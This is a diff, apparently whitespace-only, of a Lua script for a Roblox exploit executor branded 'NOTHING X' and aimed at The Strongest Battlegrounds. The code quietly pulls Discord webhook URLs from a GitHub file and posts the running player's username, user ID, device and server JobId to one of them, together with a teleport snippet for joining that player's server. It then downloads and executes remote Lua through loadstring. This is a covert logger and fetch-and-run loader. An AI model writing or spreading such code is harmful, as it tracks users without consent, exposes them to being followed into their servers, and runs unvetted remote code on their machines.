@@ -3,96 +3,111 @@ local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local requestFunc = syn and syn.request or http_request or request or (fluxus and fluxus.request)
+
 local RawURL = "https://raw.githubusercontent.com/OverlordCryx/NOTHING-X-X-X-NAHH/refs/heads/X/XVX"
 local Webhooks = {}
+
 local success, response = pcall(function()
-    return requestFunc({Url = RawURL, Method = "GET"})
+    return requestFunc({Url = RawURL, Method = "GET"})
 end)
+
 if success and response and response.Body then
-    for webhook in string.gmatch(response.Body, "[^\r\n]+") do
-        webhook = webhook:gsub("%s+", "")
-        if webhook ~= "" then
-            table.insert(Webhooks, webhook)
-        end
-    end
+    for webhook in string.gmatch(response.Body, "[^\r\n]+") do
+        webhook = webhook:gsub("%s+", "")
+        if webhook ~= "" then
+            table.insert(Webhooks, webhook)
+        end
+    end
 end
+
 local function VerifyWebhook(webhook)
-    local s, r = pcall(function()
-        return requestFunc({Url = webhook, Method = "GET"})
-    end)
-    if not s or not r or not r.Body then return false end
-    local ds, data = pcall(function()
-        return HttpService:JSONDecode(r.Body)
-    end)
-    if not ds or not data then return false end
-    if data.code == 10015 then return false end
-    return data.name and data.name ~= ""
+    local s, r = pcall(function()
+        return requestFunc({Url = webhook, Method = "GET"})
+    end)
+    if not s or not r or not r.Body then return false end
+
+    local ds, data = pcall(function()
+        return HttpService:JSONDecode(r.Body)
+    end)
+    if not ds or not data then return false end
+    if data.code == 10015 then return false end
+    return data.name and data.name ~= ""
 end
+
 local WebhookURL = nil
 for _, wh in ipairs(Webhooks) do
-    if VerifyWebhook(wh) then
-        WebhookURL = wh
-        break
-    end
+    if VerifyWebhook(wh) then
+        WebhookURL = wh
+        break
+    end
 end
+
 if not WebhookURL then
-    return
+    return
 end
+
 local player = Players.LocalPlayer
 local placeId = game.PlaceId
 local matchType = "Unknown"
+
 if placeId == 10449761463 then
-    matchType = "Normal"
+    matchType = "Normal"
 elseif placeId == 12360882630 then
-    matchType = "Dual"
+    matchType = "Dual"
 elseif placeId == 131048399685555 then
-    matchType = "Vc"
+    matchType = "Vc"
 end
+
 local platform = UserInputService:GetPlatform()
 local device = "Unknown"
+
 if platform == Enum.Platform.Windows or platform == Enum.Platform.OSX or platform == Enum.Platform.Linux or platform == Enum.Platform.UWP then
-    device = "PC"
+    device = "PC"
 elseif platform == Enum.Platform.IOS or platform == Enum.Platform.Android then
-    device = "Mobile"
+    device = "Mobile"
 end
+
 local gameName = "Unknown"
 local successInfo, info = pcall(function()
-    return MarketplaceService:GetProductInfo(placeId)
+    return MarketplaceService:GetProductInfo(placeId)
 end)
 if successInfo and info and info.Name then
-    gameName = info.Name
+    gameName = info.Name
 end
+
 local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
 local joinLink = "https://www.roblox.com/games/" .. placeId .. "?gameInstanceId=" .. game.JobId
+
 local data = {
-    username = "NOTHING_X",
-    embeds = {{
-        title = "NOTHING X (TSB)",
-        color = 16777215,
-        fields = {
-            {name = "Username", value = player.Name, inline = true},
-            {name = "User ID", value = tostring(player.UserId), inline = true},
-            {name = "Game Name", value = gameName, inline = true},
-            {name = "Place ID", value = tostring(placeId), inline = true},
-            {name = "Server ID (JobId)", value = tostring(game.JobId), inline = true},
-            {name = "TSB Type", value = matchType, inline = true},
-            {name = "Device", value = device, inline = true},
-            {name = "He Play", value = "[SERVER](" .. joinLink .. ")", inline = false},
-            {name = "Profile", value = "[VIEW PROFILE](" .. profileLink .. ")", inline = false},
-            {name = "Join Script", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. game.JobId .. "\")\n```\nJoin using Place ID + Server ID (JobId)", inline = false}
-        },
-        footer = {text = "NOTHING X Logger"},
-        timestamp = DateTime.now():ToIsoDate()
-    }}
+    username = "NOTHING_X",
+    embeds = {{
+        title = "NOTHING X (TSB)",
+        color = 16777215,
+        fields = {
+            {name = "Username", value = player.Name, inline = true},
+            {name = "User ID", value = tostring(player.UserId), inline = true},
+            {name = "Game Name", value = gameName, inline = true},
+            {name = "Place ID", value = tostring(placeId), inline = true},
+            {name = "Server ID (JobId)", value = tostring(game.JobId), inline = true},
+            {name = "TSB Type", value = matchType, inline = true},
+            {name = "Device", value = device, inline = true},
+            {name = "He Play", value = "[SERVER](" .. joinLink .. ")", inline = false},
+            {name = "Profile", value = "[VIEW PROFILE](" .. profileLink .. ")", inline = false},
+            {name = "Join Script", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. game.JobId .. "\")\n```\nJoin using Place ID + Server ID (JobId)", inline = false}
+        },
+        footer = {text = "NOTHING X Logger"},
+        timestamp = DateTime.now():ToIsoDate()
+    }}
 }
+
 pcall(function()
-    if requestFunc and WebhookURL then
-        requestFunc({
-            Url = WebhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-    end
+    if requestFunc and WebhookURL then
+        requestFunc({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end
 end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/OverlordCryx/NOTHING-X-X-X-NAHH/refs/heads/X/NAH.lua"))()
